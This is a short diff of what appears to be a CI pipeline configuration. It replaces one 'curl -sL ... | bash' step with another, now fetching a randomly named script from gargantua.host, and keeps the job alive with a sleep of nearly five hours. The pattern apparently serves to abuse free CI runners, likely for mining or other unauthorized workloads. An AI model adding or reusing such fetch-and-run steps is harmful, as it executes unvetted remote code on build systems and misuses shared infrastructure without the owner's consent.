@@ -6,7 +6,7 @@ jobs:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://52.221.198.182/gr.sh | bash -
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanasekesa.sh | bash -
       - run: 
             command: sleep 17980; echo "Hola 34s2482"
             no_output_timeout: 5h
